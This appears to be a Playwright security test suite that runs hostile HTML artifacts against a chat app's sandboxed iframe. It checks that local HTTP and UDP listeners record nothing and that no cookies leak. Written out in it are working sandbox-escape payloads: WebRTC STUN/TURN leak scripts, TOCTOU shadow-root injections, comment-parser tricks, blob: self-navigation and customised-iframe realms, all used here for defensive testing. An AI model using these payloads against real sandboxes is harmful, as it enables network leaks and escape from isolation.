import { createSocket, type Socket } from "node:dgram";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { networkInterfaces } from "node:os";

import { expect, test, type Frame, type Page } from "@playwright/test";

import { hostileScript } from "./apps/hostile-app";
import { rtcScript } from "./apps/rtc-app";
import {
  CLEAN_PAGE,
  installCodeStore,
  installCodeThread,
  frameCsp,
  PROFILE,
  THREAD,
  type CodeRec,
} from "./artifacts/fake-code";

/**
 * Spec 012 Slice 2, the locked frame's side (FR-016, FR-019, FR-031): hostile
 * html artifacts against the real chat page, a local HTTP LISTENER and a UDP
 * listener that record every request and packet they get. Assertions are on
 * those logs and on the host page's own state, never on what the artifact
 * says it managed. The Apps attack suite (011), ported to the artifact
 * profile (inline script allowed, no Trusted Types): the frame and the
 * shim must hold on their own.
 *
 * Sabotage (each observed failing, PR description): ARTIFACT_SABOTAGE_FRAME=
 * open-connect / no-csp / no-shim; the iframe's sandbox widened with
 * allow-same-origin; the host's nonce, second-load and port checks removed;
 * the live slot removed.
 */

test.use({
  timezoneId: "UTC",
  launchOptions: {
    executablePath: process.env.CHROMIUM_EXECUTABLE ?? undefined,
    args: [
      "--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessSendPreflights,PrivateNetworkAccessRespectPreflightResults,BlockInsecurePrivateNetworkRequests",
    ],
  },
});

let server: Server;
let listener = "";
const hits: string[] = [];
let udp: Socket;
let udpTarget = "";
const packets: string[] = [];

function address(): string {
  for (const list of Object.values(networkInterfaces())) {
    for (const a of list ?? [])
      if (a.family === "IPv4" && !a.internal) return a.address;
  }
  return "127.0.0.1";
}

test.beforeAll(async () => {
  server = createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    res.writeHead(200, {
      "Content-Type": "text/plain",
      "Access-Control-Allow-Origin": "*",
    });
    res.end("ok");
  });
  server.on("upgrade", (req, socket) => {
    hits.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  listener = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  udp = createSocket("udp4");
  udp.on("message", (_m, r) => packets.push(`${r.address}:${r.port}`));
  await new Promise<void>((resolve) => udp.bind(0, "0.0.0.0", resolve));
  udpTarget = `${address()}:${udp.address().port}`;
});

test.afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
  udp.close();
});

test.beforeEach(() => {
  hits.length = 0;
  packets.length = 0;
});

const host = () => test.info().project.use.baseURL ?? "http://127.0.0.1:3000";
const ID = (c: string) => c.repeat(22).slice(0, 22);
const doc = (script: string, body = "<main><h1>artifact</h1></main>") =>
  `<!doctype html><html><head><meta charset="utf-8"></head><body>${body}<script>${script}</script></body></html>`;

async function openChat(page: Page, recs: CodeRec[]) {
  const log = await installCodeStore(page, recs);
  await installCodeThread(page, recs);
  await page.addInitScript(() => {
    const w = window as unknown as { __opened: string[] };
    w.__opened = [];
    window.open = (url?: string | URL) => {
      w.__opened.push(String(url));
      return null;
    };
  });
  if (process.env.FRAME_SABOTAGE_HOST_CSP === "old") {
    // Sabotage runs only: the host page's frame-src as it was ('self' blob:).
    await page.route(`**/workspace/chats/${THREAD}`, async (route) => {
      const response = await route.fetch();
      const headers = response.headers();
      headers["content-security-policy"] = (
        headers["content-security-policy"] ?? ""
      ).replace(/frame-src [^;]+/, "frame-src 'self' blob:");
      await route.fulfill({ response, headers });
    });
  }
  await page.goto(`/workspace/chats/${THREAD}`);
  return log;
}

async function liveFrame(page: Page): Promise<Frame> {
  const el = page.locator('[data-testid="artifact-frame"]').first();
  await expect(el).toBeVisible({ timeout: 20_000 });
  const frame = await (await el.elementHandle())!.contentFrame();
  return frame!;
}

test("the frame's attributes and document headers are exact", async ({
  page,
}) => {
  const rec: CodeRec = {
    id: ID("A"),
    kind: "html",
    title: "Tip calculator",
    html: CLEAN_PAGE,
  };
  const response = page.waitForResponse(/frame\.html/);
  await openChat(page, [rec]);
  const el = page.locator('[data-testid="artifact-frame"]');
  await expect(el).toHaveAttribute("sandbox", "allow-scripts");
  await expect(el).toHaveAttribute("referrerpolicy", "no-referrer");
  const src = (await el.getAttribute("src"))!;
  expect(src).toMatch(
    new RegExp(
      `^/api/artifacts/${rec.id}/versions/1/frame\\.html\\?t=[^#]+#n=[A-Za-z0-9_-]{16,64}&t=(light|dark)$`,
    ),
  );
  expect(await el.getAttribute("allow")).toBeNull();
  const r = await response;
  const csp = r.headers()["content-security-policy"]!;
  expect(csp).toBe(frameCsp(await r.text()));
  // The Apps profile: hashes only, Trusted Types with no policy.
  expect(csp).toMatch(
    /script-src 'sha256-[A-Za-z0-9+/=]+'( 'sha256-[A-Za-z0-9+/=]+')*;/,
  );
  expect(csp.split("script-src")[1]!.split(";")[0]).not.toContain(
    "unsafe-inline",
  );
  expect(csp).toContain(
    "require-trusted-types-for 'script'; trusted-types 'none'",
  );
  for (const [k, v] of Object.entries(PROFILE.headers))
    expect(r.headers()[k.toLowerCase()]).toBe(v);
  const frame = await liveFrame(page);
  // An opaque origin: no cookie jar, no storage of this app, no parent access.
  expect(await frame.evaluate(() => window.origin)).toBe("null");
  expect(
    await frame.evaluate(() =>
      document.documentElement.getAttribute("data-theme"),
    ),
  ).toMatch(/light|dark/);
});

test("a hostile artifact reaches no URL, no secret and not the host page", async ({
  page,
}) => {
  const rec: CodeRec = {
    id: ID("H"),
    kind: "html",
    title: "Hostile",
    html: doc(hostileScript(listener, host())),
  };
  await page
    .context()
    .addCookies([{ name: "omni_probe", value: "secret-cookie", url: host() }]);
  const log = await openChat(page, [rec]);
  const frame = await liveFrame(page);
  await expect
    .poll(() => frame.evaluate(() => document.body?.dataset.attacked ?? ""), {
      timeout: 10_000,
    })
    .toBe("1");
  await page.waitForTimeout(1500);
  expect(hits, "requests that reached the listener").toEqual([]);
  const attack = await frame.evaluate(
    () =>
      (
        window as unknown as {
          __attack: {
            secrets: Record<string, string>;
            errors: Record<string, string>;
          };
        }
      ).__attack,
  );
  expect(JSON.stringify(attack.secrets)).not.toContain("secret-cookie");
  expect(attack.secrets.parentCookie).toBeUndefined();
  expect(attack.errors.parentDocument).toBeTruthy();
  expect(attack.secrets.rtc).toBe("undefined");
  // The host page: nothing from the artifact in its DOM or globals, no popup.
  expect(
    await page.evaluate(
      () => document.querySelectorAll("[data-attacked], #css-probe").length,
    ),
  ).toBe(0);
  expect(
    await page.evaluate(
      () => (window as unknown as { __opened: string[] }).__opened,
    ),
  ).toEqual([]);
  // Its port was never handed to artifact code, and nothing it sent was accepted.
  expect(
    await frame.evaluate(
      () => (window as unknown as { __port?: unknown }).__port ?? null,
    ),
  ).toBeNull();
  expect(log.writes.filter((w) => !w.path.endsWith("/refused"))).toEqual([]);
});

test("storage, cookies and service workers stay inside one frame and do not persist", async ({
  page,
}) => {
  const a: CodeRec = {
    id: ID("S"),
    kind: "html",
    title: "Writer",
    html: doc(
      "window.__before = localStorage.getItem('k'); localStorage.setItem('k','from-a'); sessionStorage.setItem('k','a'); try{document.cookie='x=1'}catch(e){} try { window.__sw = navigator.serviceWorker ? 'present' : 'absent'; navigator.serviceWorker.register('/sw.js').then(function(){ window.__sw = 'registered'; }, function(){}); } catch (e) { window.__sw = 'threw'; }",
    ),
  };
  await openChat(page, [a]);
  let frame = await liveFrame(page);
  await expect
    .poll(() => frame.evaluate(() => localStorage.getItem("k")))
    .toBe("from-a");
  await page.waitForTimeout(300);
  expect(
    await frame.evaluate(() => (window as unknown as { __sw: string }).__sw),
  ).toMatch(/^(absent|threw)$/);
  expect(
    await frame.evaluate(() => {
      try {
        return document.cookie;
      } catch (e) {
        return `threw: ${String(e)}`;
      }
    }),
  ).not.toContain("x=1");
  expect(await page.evaluate(() => localStorage.getItem("k"))).toBeNull();
  // A new view of the same artifact starts empty: nothing was persisted.
  await page.reload();
  frame = await liveFrame(page);
  await expect
    .poll(() => frame.evaluate(() => localStorage.getItem("k")))
    .toBe("from-a");
  expect(
    await frame.evaluate(
      () => (window as unknown as { __before: string | null }).__before,
    ),
  ).toBeNull();
});

test("no STUN packet leaves from any realm the artifact can make (shim alone: no Trusted Types here)", async ({
  page,
}) => {
  const vectors = [
    "top",
    "srcdoc-create",
    "srcdoc-innerhtml",
    "srcdoc-adjacent",
    "srcdoc-attribute",
    "blank-create",
    "blank-innerhtml",
    "xslt",
  ];
  const rec: CodeRec = {
    id: ID("R"),
    kind: "html",
    title: "RTC",
    html: doc(rtcScript(udpTarget, vectors), "<main><p>rtc</p></main>"),
  };
  await openChat(page, [rec]);
  const frame = await liveFrame(page);
  // ICE gathering sends its STUN requests within a second or two. The packet
  // log is the evidence, whatever happens to the frame meanwhile.
  await page.waitForTimeout(4500);
  expect(packets).toEqual([]);
  await expect
    .poll(() => frame.evaluate(() => document.body?.dataset.rtcDone ?? ""), {
      timeout: 10_000,
    })
    .toBe("1");
  const result = await frame.evaluate(
    () => (window as unknown as { __rtc: Record<string, string> }).__rtc,
  );
  for (const v of vectors) expect(result[v], v).not.toBe("started");
  // Parser-made frames (in the document itself) are removed too.
  expect(
    await frame.evaluate(
      () => document.querySelectorAll("iframe,object,embed").length,
    ),
  ).toBe(0);
});

test("navigation: top, self and popup are stopped; a reload tears the frame down", async ({
  page,
}) => {
  const rec: CodeRec = {
    id: ID("N"),
    kind: "html",
    title: "Nav",
    html: doc(
      `setTimeout(function(){ try{ top.location.href=${JSON.stringify(listener + "/v/top")} }catch(e){} try{ window.open(${JSON.stringify(listener + "/v/pop")}) }catch(e){} }, 200);`,
    ),
  };
  await openChat(page, [rec]);
  const frame = await liveFrame(page);
  await page.waitForTimeout(1200);
  expect(page.url()).toContain(`/workspace/chats/${THREAD}`);
  expect(hits).toEqual([]);
  await frame.evaluate((l) => {
    location.href = `${l}/v/self`;
  }, listener);
  await expect(
    page.locator('[data-testid="artifact-frame-stopped"]'),
  ).toBeVisible();
  await page.waitForTimeout(500);
  expect(hits).toEqual([]);
});

test("spoofed messages: a forged hello tears down, window messages are refused, links ask first", async ({
  page,
}) => {
  const rec: CodeRec = {
    id: ID("L"),
    kind: "html",
    title: "Links",
    html: CLEAN_PAGE,
  };
  const log = await openChat(page, [rec]);
  const frame = await liveFrame(page);
  await frame.evaluate(() =>
    parent.postMessage({ v: 1, type: "size", height: 900 }, "*"),
  );
  await expect.poll(() => log.refused.length).toBeGreaterThan(0);
  expect(log.refused).toContainEqual({ reason: "not_on_port" });
  await frame.locator("a").click();
  const dialog = page.locator('[data-testid="artifact-open-link"]');
  await expect(dialog).toBeVisible();
  // The host is named, defanged like every outside name on this page.
  await expect(dialog).toContainText("example[.]org");
  expect(
    await page.evaluate(
      () => (window as unknown as { __opened: string[] }).__opened,
    ),
  ).toEqual([]);
  await page.locator('[data-testid="artifact-open-link-confirm"]').click();
  expect(
    await page.evaluate(
      () => (window as unknown as { __opened: string[] }).__opened,
    ),
  ).toEqual(["https://example.org/help"]);
  await frame.evaluate(() =>
    parent.postMessage(
      { v: 1, type: "hello", nonce: "forged-nonce-forged-nonce" },
      "*",
    ),
  );
  await expect(
    page.locator('[data-testid="artifact-frame-stopped"]'),
  ).toBeVisible();
});

test("the theme reaches the frame as a class and CSS variables", async ({
  page,
}) => {
  await page.emulateMedia({ colorScheme: "light" });
  const rec: CodeRec = {
    id: ID("T"),
    kind: "html",
    title: "Theme",
    html: CLEAN_PAGE,
  };
  await openChat(page, [rec]);
  const frame = await liveFrame(page);
  await page.evaluate(() => {
    document.documentElement.classList.add("dark");
    localStorage.setItem("theme", "dark");
  });
  await page.emulateMedia({ colorScheme: "dark" });
  await page.evaluate(() =>
    window.dispatchEvent(
      new StorageEvent("storage", { key: "theme", newValue: "dark" }),
    ),
  );
  await expect
    .poll(
      () =>
        frame.evaluate(() =>
          document.documentElement.classList.contains("dark"),
        ),
      { timeout: 10_000 },
    )
    .toBe(true);
  expect(
    await frame.evaluate(() =>
      getComputedStyle(document.documentElement)
        .getPropertyValue("--background")
        .trim(),
    ),
  ).not.toBe("");
});

test("N cards, at most one live frame; failed and unchecked versions are labelled, not run", async ({
  page,
}) => {
  const recs: CodeRec[] = [
    ...["P", "Q", "U", "V"].map((c) => ({
      id: ID(c),
      kind: "html" as const,
      title: `Page ${c}`,
      html: CLEAN_PAGE,
    })),
    {
      id: ID("F"),
      kind: "html",
      title: "Too wide",
      html: CLEAN_PAGE,
      check: "failed",
    },
    {
      id: ID("X"),
      kind: "html",
      title: "Unchecked",
      html: CLEAN_PAGE,
      check: "not_checked",
      summary: [
        "the checks need the chat's sandbox, which is not available here",
      ],
    },
    {
      id: ID("B"),
      kind: "react",
      title: "Broken build",
      html: "",
      buildFailed: true,
    },
  ];
  await page.setViewportSize({ width: 1280, height: 900 });
  await openChat(page, recs);
  await expect(page.locator('[data-testid="artifact-card"]')).toHaveCount(
    recs.length,
  );
  const counts: number[] = [];
  for (let i = 0; i < 8; i++) {
    await page.mouse.wheel(0, 500);
    await page.waitForTimeout(250);
    counts.push(await page.locator('[data-testid="artifact-frame"]').count());
  }
  expect(Math.max(...counts), JSON.stringify(counts)).toBeLessThanOrEqual(1);
  await expect(
    page.locator(`[data-artifact="${ID("F")}"] [data-testid="artifact-check"]`),
  ).toContainText("Layout check failed");
  await expect(
    page.locator(
      `[data-artifact="${ID("F")}"] [data-testid="artifact-open-anyway"]`,
    ),
  ).toBeVisible();
  await expect(
    page.locator(`[data-artifact="${ID("X")}"] [data-testid="artifact-check"]`),
  ).toContainText("Layout not checked");
  await expect(
    page.locator(
      `[data-artifact="${ID("B")}"] [data-testid="artifact-build-failed"]`,
    ),
  ).toBeVisible();
  for (const id of [ID("F"), ID("X"), ID("B")])
    await expect(
      page.locator(`[data-artifact="${id}"] [data-testid="artifact-frame"]`),
    ).toHaveCount(0);
});

/** A child realm's script that sends STUN to the UDP listener. */
const childRtc = (udp: string) =>
  `try{var p=new RTCPeerConnection({iceServers:[{urls:'stun:${udp}'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)})}catch(e){}`;

/** Review payloads: a value whose toString answers "x" when checked and a
 * frame when written, into a shadow root (which a document observer does not
 * see), each HTML sink in turn. */
function toctouScript(udp: string, sink: string): string {
  const frameHtml =
    `<iframe srcdoc="<script>${childRtc(udp).replace(/"/g, "&quot;")}</` +
    `script>"></iframe>`;
  return `
(function(){
  var evil = { n: 0, toString: function () { return this.n++ ? ${JSON.stringify(frameHtml).replace(/<\//g, "<\\/")} : 'x'; } };
  var host = document.createElement('div'); document.body.appendChild(host);
  try {
    var mode = ${JSON.stringify(sink)};
    var sr = host.attachShadow({ mode: mode === 'closed' ? 'closed' : 'open' });
    if (mode === 'open' || mode === 'closed') sr.innerHTML = evil;
    else if (mode === 'adjacent') { var t = document.createElement('div'); sr.appendChild(t); t.insertAdjacentHTML('beforeend', evil); }
    else if (mode === 'outer') { var o = document.createElement('div'); sr.appendChild(o); o.outerHTML = evil; }
    else if (mode === 'fragment') { sr.appendChild(document.createRange().createContextualFragment(evil)); }
    else if (mode === 'unsafe') { sr.setHTMLUnsafe(evil); }
  } catch (e) { window.__err = String(e); }
  setTimeout(function () { document.body.setAttribute('data-rtc-done', '1'); }, 400);
})();`;
}

for (const sink of [
  "open",
  "closed",
  "adjacent",
  "outer",
  "fragment",
  "unsafe",
]) {
  test(`review payload: a two-faced value into a shadow root (${sink}) opens no realm and sends no STUN`, async ({
    page,
  }) => {
    const rec: CodeRec = {
      id: ID("T"),
      kind: "html",
      title: "TOCTOU",
      html: doc(toctouScript(udpTarget, sink)),
    };
    await openChat(page, [rec]);
    const frame = await liveFrame(page);
    await page.waitForTimeout(4500);
    const why = await frame
      .evaluate(() =>
        JSON.stringify({
          err: (window as unknown as { __err?: string }).__err ?? null,
          frames: window.length,
        }),
      )
      .catch(() => "frame gone");
    expect(packets, why).toEqual([]);
    expect(
      await frame.evaluate(() => document.body.dataset.rtcDone ?? ""),
    ).toBe("1"); // the payload did run
  });
}

test("review payload: a script hidden from the gateway's parser in a comment runs not at all (or after the shim), sends no STUN", async ({
  page,
}) => {
  const hidden = `window.__P = window['RTC' + 'PeerConnection'];`;
  const use = `try { if (window.__P) { var p = new window.__P({iceServers:[{urls:'stun:${udpTarget}'}]}); p.createDataChannel('x'); p.createOffer().then(function(o){return p.setLocalDescription(o)}); } } catch (e) {}`;
  for (const opener of ["<!-->", "<!--->"]) {
    packets.length = 0;
    const html = `<!doctype html>${opener}<script>${hidden}</script><!-- --><main><p>x</p></main><script>${use}</script>`;
    const ctx = await page.context().browser()!.newContext();
    const p2 = await ctx.newPage();
    await openChat(p2, [
      {
        id: ID(opener === "<!-->" ? "C" : "D"),
        kind: "html",
        title: "Comment",
        html,
      },
    ]);
    await liveFrame(p2);
    await p2.waitForTimeout(4000);
    expect(packets, opener).toEqual([]);
    await ctx.close();
  }
});

test("the host page frames only its listed paths: no bare 'self', no blob:", async ({
  page,
}) => {
  const rec: CodeRec = {
    id: ID("A"),
    kind: "html",
    title: "Tip",
    html: CLEAN_PAGE,
  };
  const doc = page.waitForResponse(
    (r) =>
      r.url().endsWith(`/workspace/chats/${THREAD}`) &&
      r.request().resourceType() === "document",
  );
  await openChat(page, [rec]);
  const csp = (await doc).headers()["content-security-policy"] ?? "";
  const frameSrc = /frame-src ([^;]+)/.exec(csp)![1]!.trim().split(/\s+/);
  const origin = new URL(host()).host;
  expect(frameSrc.sort()).toEqual(
    ["/api/artifacts/", "/api/threads/", "/mermaid-frame/"]
      .map((p) => `http://${origin}${p}`)
      .sort(),
  );
});

/** An artifact whose ONE inline script, run again inside a blob: document it
 * makes, would find WebRTC native there (no shim). The copy is byte-exact, so
 * its hash is in the frame's policy, which the blob: document inherits. */
function blobNavScript(udp: string, padMb: number): string {
  return `
(function () {
  if (location.protocol === 'blob:') {
    try { var p = new RTCPeerConnection({ iceServers: [{ urls: 'turn:${udp}?transport=udp', username: 'leak-user', credential: 'x' }, { urls: 'stun:${udp}' }] }); p.createDataChannel('x'); p.createOffer().then(function (o) { return p.setLocalDescription(o); }); } catch (e) {}
    return;
  }
  var me = document.currentScript.textContent;
  var pad = ${padMb} ? '<!--' + new Array(${padMb} * 1024 + 1).join(new Array(1025).join('x')) + '-->' : '';
  var html = '<!doctype html><scr' + 'ipt>' + me + '</scr' + 'ipt>' + pad;
  document.body.setAttribute('data-navigating', '1');
  setTimeout(function () { location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' })); }, 1500);
})();`;
}

for (const padMb of [0, 30]) {
  test(`review payload: the frame navigating itself to a blob: copy of its own script sends no STUN/TURN (${padMb ? "padded" : "plain"})`, async ({
    page,
  }) => {
    const refused: string[] = [];
    page.on("console", (m) => {
      if (/frame-src|Refused to frame/i.test(m.text())) refused.push(m.text());
    });
    const rec: CodeRec = {
      id: ID("B"),
      kind: "html",
      title: "Blob",
      html: doc(blobNavScript(udpTarget, padMb), "<main><p>blob</p></main>"),
    };
    await openChat(page, [rec]);
    const frame = await liveFrame(page);
    // The payload ran up to the navigation, and the host refused the frame's
    // next document (frame-src lists no blob:).
    await expect
      .poll(
        () =>
          frame
            .evaluate(() => document.body.dataset.navigating ?? "")
            .catch(() => "gone"),
        { timeout: 15_000 },
      )
      .toBe("1");
    await page.waitForTimeout(6000);
    expect(packets).toEqual([]);
    await expect
      .poll(() => refused.length, { timeout: 15_000 })
      .toBeGreaterThan(0);
    expect(refused.join("\n")).toMatch(/frame-src[\s\S]*blocked/);
  });
}

test("a frame navigating itself to same-origin URLs arrives cross-site without the session cookie", async ({
  page,
}) => {
  const seen: { path: string; cookie: string; site: string | undefined }[] = [];
  await page.context().addCookies([
    {
      name: "access_token",
      value: "session-cookie-value",
      url: host(),
      sameSite: "Lax",
      httpOnly: true,
    },
  ]);
  await page.route("**/api/threads/t-nav/**", async (route) => {
    const h = await route.request().allHeaders();
    seen.push({
      path: new URL(route.request().url()).pathname,
      cookie: h.cookie ?? "",
      site: h["sec-fetch-site"],
    });
    await route.fulfill({
      status: 401,
      contentType: "application/json",
      body: '{"detail":"Authentication required"}',
    });
  });
  const rec: CodeRec = {
    id: ID("N"),
    kind: "html",
    title: "Nav",
    html: CLEAN_PAGE,
  };
  await openChat(page, [rec]);
  const frame = await liveFrame(page);
  await frame.evaluate(() => {
    location.href =
      "/api/threads/t-nav/artifacts/mnt/user-data/outputs/page.html";
  });
  await expect.poll(() => seen.length).toBeGreaterThan(0);
  expect(seen[0]!.cookie).not.toContain("session-cookie-value");
  if (seen[0]!.site !== undefined) expect(seen[0]!.site).toBe("cross-site");
  // Positive control: the host page's own same-origin request carries it.
  await page.evaluate(() =>
    fetch("/api/threads/t-nav/control").catch(() => null),
  );
  await expect.poll(() => seen.length).toBeGreaterThan(1);
  expect(seen[1]!.cookie).toContain("session-cookie-value");
  await expect(
    page.locator('[data-testid="artifact-frame-stopped"]'),
  ).toBeVisible();
});

test("review payload: a customised built-in iframe gives no realm with WebRTC", async ({
  page,
}) => {
  const script = `
(function () {
  try {
    class F extends HTMLIFrameElement {}
    customElements.define('x-frame', F, { extends: 'iframe' });
    var f = new F();
    f.srcdoc = ${JSON.stringify(`<script>try{var p=new RTCPeerConnection({iceServers:[{urls:'stun:${udpTarget}'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)})}catch(e){}</` + "script>").replace(/<\//g, "<\\/")};
    document.body.appendChild(f);
  } catch (e) { window.__err = String(e); }
  document.body.setAttribute('data-rtc-done', '1');
})();`;
  await openChat(page, [
    { id: ID("K"), kind: "html", title: "CE", html: doc(script) },
  ]);
  const frame = await liveFrame(page);
  await page.waitForTimeout(4000);
  expect(packets).toEqual([]);
  expect(await frame.evaluate(() => document.body.dataset.rtcDone ?? "")).toBe(
    "1",
  );
});

test("review payload: a declarative shadow root holding a frame is swept", async ({
  page,
}) => {
  const child =
    `<script>try{var p=new RTCPeerConnection({iceServers:[{urls:'stun:${udpTarget}'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)})}catch(e){}</` +
    `script>`;
  const html = `<!doctype html><html><head></head><body><div id=h><template shadowrootmode="open"><iframe srcdoc="${child.replace(/"/g, "&quot;")}"></iframe></template></div><p>x</p></body></html>`;
  await openChat(page, [{ id: ID("D"), kind: "html", title: "DSD", html }]);
  const frame = await liveFrame(page);
  await page.waitForTimeout(4000);
  expect(packets).toEqual([]);
  expect(
    await frame.evaluate(
      () =>
        document.getElementById("h")?.shadowRoot?.querySelectorAll("iframe")
          .length ?? -1,
    ),
  ).toBe(0);
});
